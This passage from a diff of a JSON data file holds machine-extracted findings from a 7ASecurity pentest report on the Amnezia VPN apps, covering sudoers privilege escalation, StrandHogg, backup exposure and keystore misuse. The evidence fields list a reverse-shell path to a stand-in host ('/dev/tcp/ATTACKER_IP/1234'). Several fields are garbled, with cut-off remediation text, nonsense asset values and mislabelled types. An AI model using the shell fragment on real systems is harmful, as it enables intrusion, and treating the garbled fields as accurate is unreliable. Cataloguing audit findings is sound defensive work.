(AVP-01-004) as well as other attack vectors.\n● Screenshot Leaks: Both apps would benefit from implementing a security\nscreen to avoid leaks via screenshots and app backgrounding (AVP-01-002).\n● General Hardening: Other less important hardening recommendations include\nimplementing a root/jailbreak detection mechanism to alert users about security\nrisks prior to using the applications (AVP-01-008), implementing binary hardening\nprotections (AVP-01-009), and using safer security settings to protect users\nrunning older devices (AVP-01-007).\n7ASecurity © 2022\n36\n\n-- 36 of 37 --\n\nPentest Report\nIt is advised to address all issues identified in this report, including informational and low\nseverity tickets where possible. This will not just strengthen the security posture of the\nplatform significantly, but also reduce the number of tickets in future assignments.\nOnce all issues in this report are addressed and verified, a more thorough review,\nincluding another code audit, is highly recommended in the future to ensure adequate\nsecurity coverage of the platform. Please note that future audits should ideally allow for a\ngreater budget so that test teams are able to deep dive into more complex attack\nscenarios. Some examples of this could be third party integrations, complex features that\nrequire to exercise all the application logic for full visibility, authentication flows,\nchallenge-response mechanisms implemented, subtle vulnerabilities, logic bugs, and\ncomplex vulnerabilities derived from the inner workings of dependencies in the context of\nthe application. Additionally, the scope could perhaps be extended to include other\ninternet-facing Amnezia VPN resources.\nIt is advised to test the platform regularly, at least once a year or when substantial\nchanges are going to be deployed, to make sure new features do not introduce\nundesired security vulnerabilities. This proven strategy will reduce the number of security\nissues consistently and make the platform highly resilient against malicious attacks over\ntime.\n7ASecurity would like to take this opportunity to sincerely thank Anton Bulychev and the\nrest of the Amnezia VPN team, for their exemplary assistance and support throughout\nthis audit. Last but not least, appreciation must be extended to the Open Technology\nFund (OTF) for sponsoring this project.\n7ASecurity © 2022\n37\n\n-- 37 of 37 --",
+    "sourceFileName": "pentest-report-amneziavpn.pdf",
+    "createdAtIso": "2026-06-05T23:29:13.533Z",
+    "updatedAtIso": "2026-06-05T23:29:13.533Z"
+  },
+  "findings": [
+    {
+      "id": "F-7asecurity-001",
+      "slug": "linux-mac-root-privesc-via-insecure-permissions-etc-sudoers",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Linux/Mac root PrivEsc via insecure Permissions",
+      "cve": "—",
+      "severity": "Critical",
+      "asset": "/etc/sudoers",
+      "score": 94,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Linux/Mac root PrivEsc via insecure Permissions affecting /etc/sudoers; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against /etc/sudoers if this issue remains unaddressed.",
+      "evidence": "Finding IDs: AVP-01-001 | Assets: /etc/sudoers | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.10, https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.9, https://github.com/amnezia-vpn/desktop-client/pull/90, https://nmap.org/ncat | Domains: github.com, nmap.org, update-resolv-conf.sh, components.xml, InstallationLog.txt, installer.dat, maintenancetool.dat, maintenancetool.ini, network.xml, AmneziaVPN.desktop, openssl-easyrsa.cnf, qt.conf, AmneziaVPN.service, AmneziaVPN.app, update-resolve-conf.sh | IPs: 0.0.0.0 | File paths: /etc/sudoers, /opt/AmneziaVPN/, /opt/AmneziaVPN/client, /opt/AmneziaVPN/client/share, /opt/AmneziaVPN/client/share/icons, /opt/AmneziaVPN/client/share/icons/AmneziaVPN_Logo.png, /opt/AmneziaVPN/client/share/applications, /opt/AmneziaVPN/client/share/applications/AmneziaVPN_build.desktop, /opt/AmneziaVPN/client/AmneziaVPN.desktop, /opt/AmneziaVPN/client/bin, /opt/AmneziaVPN/client/bin/update-resolv-conf.sh, /opt/AmneziaVPN/client/bin/openssl-easyrsa.cnf, /opt/AmneziaVPN/client/bin/easyrsa, /opt/AmneziaVPN/client/bin/qt.conf, /opt/AmneziaVPN/post_install.sh, /opt/AmneziaVPN/service, /opt/AmneziaVPN/service/share, /opt/AmneziaVPN/service/share/applications, /opt/AmneziaVPN/service/share/applications/AmneziaVPN_build.desktop, /opt/AmneziaVPN/service/AmneziaVPN.service, /opt/AmneziaVPN/service/translations, /opt/AmneziaVPN/service/translations/qt_en.qm, /opt/AmneziaVPN/service/translations/qt_lv.qm, /opt/AmneziaVPN/service/translations/qt_fr.qm, /opt/AmneziaVPN/service/lib, /opt/AmneziaVPN/service/bin, /opt/AmneziaVPN/post_uninstall.sh, /opt/AmneziaVPN/AmneziaVPN_build.desktop, /dev/tcp/ATTACKER_IP/1234, components.xml, maintenancetool.ini, network.xml, opt/AmneziaVPN/client/bin/qt.conf | File names: update-resolv-conf.sh, components.xml, network.xml, post_install.sh, post_uninstall.sh, qt.conf, update-resolve-conf.sh | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "ensure all VPN client installers implement the minimum necessary",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.489Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Linux/Mac root PrivEsc via insecure Permissions",
+        "severity": "Critical",
+        "asset": "/etc/sudoers",
+        "status": "Open",
+        "summary": "Linux/Mac root PrivEsc via insecure Permissions affecting /etc/sudoers; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against /etc/sudoers if this issue remains unaddressed.",
+        "evidence": "Finding IDs: AVP-01-001 | Assets: /etc/sudoers | Services: HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.10, https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.9, https://github.com/amnezia-vpn/desktop-client/pull/90, https://nmap.org/ncat | Domains: github.com, nmap.org, update-resolv-conf.sh, components.xml, InstallationLog.txt, installer.dat, maintenancetool.dat, maintenancetool.ini, network.xml, AmneziaVPN.desktop, openssl-easyrsa.cnf, qt.conf, AmneziaVPN.service, AmneziaVPN.app, update-resolve-conf.sh | IPs: 0.0.0.0 | File paths: /etc/sudoers, /opt/AmneziaVPN/, /opt/AmneziaVPN/client, /opt/AmneziaVPN/client/share, /opt/AmneziaVPN/client/share/icons, /opt/AmneziaVPN/client/share/icons/AmneziaVPN_Logo.png, /opt/AmneziaVPN/client/share/applications, /opt/AmneziaVPN/client/share/applications/AmneziaVPN_build.desktop, /opt/AmneziaVPN/client/AmneziaVPN.desktop, /opt/AmneziaVPN/client/bin, /opt/AmneziaVPN/client/bin/update-resolv-conf.sh, /opt/AmneziaVPN/client/bin/openssl-easyrsa.cnf, /opt/AmneziaVPN/client/bin/easyrsa, /opt/AmneziaVPN/client/bin/qt.conf, /opt/AmneziaVPN/post_install.sh, /opt/AmneziaVPN/service, /opt/AmneziaVPN/service/share, /opt/AmneziaVPN/service/share/applications, /opt/AmneziaVPN/service/share/applications/AmneziaVPN_build.desktop, /opt/AmneziaVPN/service/AmneziaVPN.service, /opt/AmneziaVPN/service/translations, /opt/AmneziaVPN/service/translations/qt_en.qm, /opt/AmneziaVPN/service/translations/qt_lv.qm, /opt/AmneziaVPN/service/translations/qt_fr.qm, /opt/AmneziaVPN/service/lib, /opt/AmneziaVPN/service/bin, /opt/AmneziaVPN/post_uninstall.sh, /opt/AmneziaVPN/AmneziaVPN_build.desktop, /dev/tcp/ATTACKER_IP/1234, components.xml, maintenancetool.ini, network.xml, opt/AmneziaVPN/client/bin/qt.conf | File names: update-resolv-conf.sh, components.xml, network.xml, post_install.sh, post_uninstall.sh, qt.conf, update-resolve-conf.sh | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "ensure all VPN client installers implement the minimum necessary",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.10",
+          "https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.9",
+          "https://github.com/amnezia-vpn/desktop-client/pull/90",
+          "https://nmap.org/ncat",
+          "github.com",
+          "nmap.org",
+          "update-resolv-conf.sh",
+          "components.xml",
+          "InstallationLog.txt",
+          "installer.dat",
+          "maintenancetool.dat",
+          "maintenancetool.ini",
+          "network.xml",
+          "AmneziaVPN.desktop",
+          "openssl-easyrsa.cnf",
+          "qt.conf",
+          "AmneziaVPN.service",
+          "AmneziaVPN.app",
+          "update-resolve-conf.sh",
+          "0.0.0.0"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "linux/mac root privesc via insecure permissions",
+        "normalizedAsset": "/etc/sudoers",
+        "canonicalKey": "AVP-01-001|linux mac root privesc via insecure permissions|etc sudoers||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Linux/Mac root PrivEsc via insecure Permissions",
+        "sourceText": "AVP-01-001 WP2: Linux/Mac root PrivEsc via insecure Permissions (Critical) 5",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Linux/Mac root PrivEsc via insecure Permissions",
+      "canonicalKey": "AVP-01-001|linux mac root privesc via insecure permissions|etc sudoers||||||"
+    },
+    {
+      "id": "F-7asecurity-002",
+      "slug": "possible-android-ios-leaks-via-missing-security-screen-qtactivity-java",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Possible Android/iOS Leaks via Missing Security Screen",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "QtActivity.java",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Possible Android/iOS Leaks via Missing Security Screen affecting QtActivity.java; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against QtActivity.java if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-002 | Assets: QtActivity.java | Services: HTTPS, HTTP | URLs: https://github.com/amnezia-vpn/desktop-client/pull/114, http://developer.android.com/reference/android/view/Display.html#FLAG_SECURE, https://developer.android.com/reference/androidx/lifecycle/Lifecycle.Event, https://developer.android.com/.../Application.ActivityLifecycleCallbacks#onActivityPaused, https://developer.apple.com/...-applicationwillresignactive?language=objc, https://www.hackingwithswift.com/example-code/system/how-to-detect-when-your-app-mo...ackground | Domains: github.com, developer.android.com, developer.apple.com, www.hackingwithswift.com, QtActivity.java, Display.html, Lifecycle.Event, Application.ActivityLifecycleCallbacks | File paths: QtActivity.java | File names: QtActivity.java | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "render a security screen on top when the app is going to be sent to",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.491Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Possible Android/iOS Leaks via Missing Security Screen",
+        "severity": "Low",
+        "asset": "QtActivity.java",
+        "status": "In Review",
+        "summary": "Possible Android/iOS Leaks via Missing Security Screen affecting QtActivity.java; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against QtActivity.java if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-002 | Assets: QtActivity.java | Services: HTTPS, HTTP | URLs: https://github.com/amnezia-vpn/desktop-client/pull/114, http://developer.android.com/reference/android/view/Display.html#FLAG_SECURE, https://developer.android.com/reference/androidx/lifecycle/Lifecycle.Event, https://developer.android.com/.../Application.ActivityLifecycleCallbacks#onActivityPaused, https://developer.apple.com/...-applicationwillresignactive?language=objc, https://www.hackingwithswift.com/example-code/system/how-to-detect-when-your-app-mo...ackground | Domains: github.com, developer.android.com, developer.apple.com, www.hackingwithswift.com, QtActivity.java, Display.html, Lifecycle.Event, Application.ActivityLifecycleCallbacks | File paths: QtActivity.java | File names: QtActivity.java | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "render a security screen on top when the app is going to be sent to",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/114",
+          "http://developer.android.com/reference/android/view/Display.html#FLAG_SECURE",
+          "https://developer.android.com/reference/androidx/lifecycle/Lifecycle.Event",
+          "https://developer.android.com/.../Application.ActivityLifecycleCallbacks#onActivityPaused",
+          "https://developer.apple.com/...-applicationwillresignactive?language=objc",
+          "https://www.hackingwithswift.com/example-code/system/how-to-detect-when-your-app-mo...ackground",
+          "github.com",
+          "developer.android.com",
+          "developer.apple.com",
+          "www.hackingwithswift.com",
+          "QtActivity.java",
+          "Display.html",
+          "Lifecycle.Event",
+          "Application.ActivityLifecycleCallbacks"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "possible android/ios leaks via missing security screen",
+        "normalizedAsset": "qtactivity.java",
+        "canonicalKey": "AVP-01-002|possible android ios leaks via missing security screen|qtactivity java||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Possible Android/iOS Leaks via Missing Security Screen",
+        "sourceText": "AVP-01-002 WP1: Possible Android/iOS Leaks via Missing Security Screen (Low) 8",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Possible Android/iOS Leaks via Missing Security Screen",
+      "canonicalKey": "AVP-01-002|possible android ios leaks via missing security screen|qtactivity java||||||"
+    },
+    {
+      "id": "F-7asecurity-003",
+      "slug": "possible-phishing-via-strandhogg-2-0-on-android-android-7-cve-2020-0096",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Possible Phishing via StrandHogg 2.0 on Android",
+      "cve": "CVE-2020-0096",
+      "severity": "Medium",
+      "asset": "Android 7",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Possible Phishing via StrandHogg 2.0 on Android affecting Android 7; extractor found type Denial of Service, reference CVE-2020-0096, product Android 7. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes credential theft, command-and-control communication, lateral movement, or unauthorized remote execution involving Android 7.",
+      "evidence": "Finding IDs: AVP-01-003 | CVEs: CVE-2020-0096 | Products: Android 7 | Assets: AndroidManifest.xml | Services: HTTPS, HTTP | URLs: https://arstechnica.com/.../...fully-patched-android-phones-under-active-attack-by-bank-thieves/, https://source.android.com/security/bulletin/2020-05-01, https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained-developer-mitigation/, https://www.helpnetsecurity.com/2020/05/28/cve-2020-0096/, https://s2.ist.psu.edu/paper/usenix15-final-ren.pdf, https://www.helpnetsecurity.com/2019/12/03/strandhogg-vulnerability/, https://developer.android.com/guide/topics/manifest/activity-element#lmode, https://github.com/amnezia-vpn/desktop-client/commit/53e240add72904c586d02ae, https://7as.es/AmneziaVPN_uEuw9k6N/task-hijacking.mp4, http://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html, https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained.../, https://www.xda-developers.com/strandhogg-2-0.../ | Domains: arstechnica.com, source.android.com, www.xda-developers.com, www.helpnetsecurity.com, s2.ist.psu.edu, developer.android.com, github.com, 7as.es, blog.takemyhand.xyz, 3-9.x15, M2.taskAffinity, com.victim.app, M2.allowTaskReparenting, usenix15-final-ren.pdf, AndroidManifest.xml, org.qtproject.qt5.android.bindings.QtActivity, task-hijacking.mp4, android-task-hijacking-with.html | File paths: AndroidManifest.xml | File names: AndroidManifest.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "implement as many of the following countermeasures as deemed",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.492Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Possible Phishing via StrandHogg 2.0 on Android",
+        "cve": "CVE-2020-0096",
+        "severity": "Medium",
+        "asset": "Android 7",
+        "status": "In Review",
+        "summary": "Possible Phishing via StrandHogg 2.0 on Android affecting Android 7; extractor found type Denial of Service, reference CVE-2020-0096, product Android 7. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes credential theft, command-and-control communication, lateral movement, or unauthorized remote execution involving Android 7.",
+        "evidence": "Finding IDs: AVP-01-003 | CVEs: CVE-2020-0096 | Products: Android 7 | Assets: AndroidManifest.xml | Services: HTTPS, HTTP | URLs: https://arstechnica.com/.../...fully-patched-android-phones-under-active-attack-by-bank-thieves/, https://source.android.com/security/bulletin/2020-05-01, https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained-developer-mitigation/, https://www.helpnetsecurity.com/2020/05/28/cve-2020-0096/, https://s2.ist.psu.edu/paper/usenix15-final-ren.pdf, https://www.helpnetsecurity.com/2019/12/03/strandhogg-vulnerability/, https://developer.android.com/guide/topics/manifest/activity-element#lmode, https://github.com/amnezia-vpn/desktop-client/commit/53e240add72904c586d02ae, https://7as.es/AmneziaVPN_uEuw9k6N/task-hijacking.mp4, http://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html, https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained.../, https://www.xda-developers.com/strandhogg-2-0.../ | Domains: arstechnica.com, source.android.com, www.xda-developers.com, www.helpnetsecurity.com, s2.ist.psu.edu, developer.android.com, github.com, 7as.es, blog.takemyhand.xyz, 3-9.x15, M2.taskAffinity, com.victim.app, M2.allowTaskReparenting, usenix15-final-ren.pdf, AndroidManifest.xml, org.qtproject.qt5.android.bindings.QtActivity, task-hijacking.mp4, android-task-hijacking-with.html | File paths: AndroidManifest.xml | File names: AndroidManifest.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "implement as many of the following countermeasures as deemed",
+        "references": [
+          "CVE-2020-0096",
+          "https://arstechnica.com/.../...fully-patched-android-phones-under-active-attack-by-bank-thieves/",
+          "https://source.android.com/security/bulletin/2020-05-01",
+          "https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained-developer-mitigation/",
+          "https://www.helpnetsecurity.com/2020/05/28/cve-2020-0096/",
+          "https://s2.ist.psu.edu/paper/usenix15-final-ren.pdf",
+          "https://www.helpnetsecurity.com/2019/12/03/strandhogg-vulnerability/",
+          "https://developer.android.com/guide/topics/manifest/activity-element#lmode",
+          "https://github.com/amnezia-vpn/desktop-client/commit/53e240add72904c586d02ae",
+          "https://7as.es/AmneziaVPN_uEuw9k6N/task-hijacking.mp4",
+          "http://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html",
+          "https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained.../",
+          "https://www.xda-developers.com/strandhogg-2-0.../",
+          "arstechnica.com",
+          "source.android.com",
+          "www.xda-developers.com",
+          "www.helpnetsecurity.com",
+          "s2.ist.psu.edu",
+          "developer.android.com",
+          "github.com",
+          "7as.es",
+          "blog.takemyhand.xyz",
+          "3-9.x15",
+          "M2.taskAffinity",
+          "com.victim.app",
+          "M2.allowTaskReparenting",
+          "usenix15-final-ren.pdf",
+          "AndroidManifest.xml",
+          "org.qtproject.qt5.android.bindings.QtActivity",
+          "task-hijacking.mp4",
+          "android-task-hijacking-with.html"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "possible phishing via strandhogg 2.0 on android",
+        "normalizedAsset": "android 7",
+        "canonicalKey": "AVP-01-003|possible phishing via strandhogg 2 0 on android|android 7||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Possible Phishing via StrandHogg 2.0 on Android",
+        "sourceText": "AVP-01-003 WP1: Possible Phishing via StrandHogg 2.0 on Android (Medium) 11",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported",
+          "cve": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Possible Phishing via StrandHogg 2.0 on Android",
+      "canonicalKey": "AVP-01-003|possible phishing via strandhogg 2 0 on android|android 7||||||"
+    },
+    {
+      "id": "F-7asecurity-004",
+      "slug": "vpn-config-access-via-android-ios-backups-a-value-of-false-for",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "VPN Config Access via Android & iOS Backups",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "a value of false for",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "VPN Config Access via Android & iOS Backups affecting a value of false for; extractor found product a value of false for. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against a value of false for if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-004 | Products: a value of false for | Assets: f/.config/AmneziaVPN.ORG/AmneziaVPN.conf | Services: SSH, HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://www.slideshare.net/phdays/android-task-hijacking | Domains: github.com, www.slideshare.net, backup.ab, org.amnezia.vpn, AmneziaVPN.ORG, AmneziaVPN.conf, org.amnezia.AmneziaVPN, org.amneziavpn.Amnezia, VPN.plist, AndroidManifest.xml | IPs: 5.45.92.15 | File paths: f/.config/AmneziaVPN.ORG/AmneziaVPN.conf, AndroidManifest.xml | File names: AmneziaVPN.conf, AndroidManifest.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "explicitly disable Android backups in the AndroidManifest",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.494Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "VPN Config Access via Android & iOS Backups",
+        "severity": "Medium",
+        "asset": "a value of false for",
+        "status": "In Review",
+        "summary": "VPN Config Access via Android & iOS Backups affecting a value of false for; extractor found product a value of false for. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against a value of false for if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-004 | Products: a value of false for | Assets: f/.config/AmneziaVPN.ORG/AmneziaVPN.conf | Services: SSH, HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://www.slideshare.net/phdays/android-task-hijacking | Domains: github.com, www.slideshare.net, backup.ab, org.amnezia.vpn, AmneziaVPN.ORG, AmneziaVPN.conf, org.amnezia.AmneziaVPN, org.amneziavpn.Amnezia, VPN.plist, AndroidManifest.xml | IPs: 5.45.92.15 | File paths: f/.config/AmneziaVPN.ORG/AmneziaVPN.conf, AndroidManifest.xml | File names: AmneziaVPN.conf, AndroidManifest.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "explicitly disable Android backups in the AndroidManifest",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/99",
+          "https://github.com/amnezia-vpn/desktop-client/pull/97",
+          "https://www.slideshare.net/phdays/android-task-hijacking",
+          "github.com",
+          "www.slideshare.net",
+          "backup.ab",
+          "org.amnezia.vpn",
+          "AmneziaVPN.ORG",
+          "AmneziaVPN.conf",
+          "org.amnezia.AmneziaVPN",
+          "org.amneziavpn.Amnezia",
+          "VPN.plist",
+          "AndroidManifest.xml",
+          "5.45.92.15"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "vpn config access via android & ios backups",
+        "normalizedAsset": "a value of false for",
+        "canonicalKey": "AVP-01-004|vpn config access via android ios backups|a value of false for||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "VPN Config Access via Android & iOS Backups",
+        "sourceText": "AVP-01-004 WP1: VPN Config Access via Android & iOS Backups (Medium) 13",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "VPN Config Access via Android & iOS Backups",
+      "canonicalKey": "AVP-01-004|vpn config access via android ios backups|a value of false for||||||"
+    },
+    {
+      "id": "F-7asecurity-005",
+      "slug": "config-access-via-incorrect-android-keystore-usage-files-config-amneziavpn-org-amneziavpn-conf-33-ht",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Config Access via incorrect Android Keystore Usage",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Config Access via incorrect Android Keystore Usage affecting files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997 if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-005 | Assets: files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997 | Services: HTTPS | URLs: https://developer.android.com/topic/security/data, https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997, https://developer.android.com/training/articles/keystore, https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/, https://developer.apple.com/library/...#//apple_ref/doc/uid/TP40010672-CH2-SW28, https://www.zetetic.net/sqlcipher/, https://developer.android.com/guide/topics/data/autobackup, https://developer.android.com/guide/topics/manifest/application-element#fullBackupContent | Domains: developer.android.com, www.cvedetails.com, github.com, bencoding.com, developer.apple.com, www.zetetic.net, AmneziaVPN.ORG, AmneziaVPN.conf, vulnerability-list.php | IPs: 5.45.92.15 | File paths: AmneziaVPN.conf, www.cvedetails.com/vulnerability-list.php | File names: AmneziaVPN.conf, vulnerability-list.php | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "leverage the options provided by the platform to store application",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.495Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Config Access via incorrect Android Keystore Usage",
+        "severity": "Medium",
+        "asset": "files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997",
+        "status": "In Review",
+        "summary": "Config Access via incorrect Android Keystore Usage affecting files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997; extractor found type Privilege Escalation. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against files\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf 33 https://developer.android.com/topic/security/data 32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997 if this signal is not reviewed.",
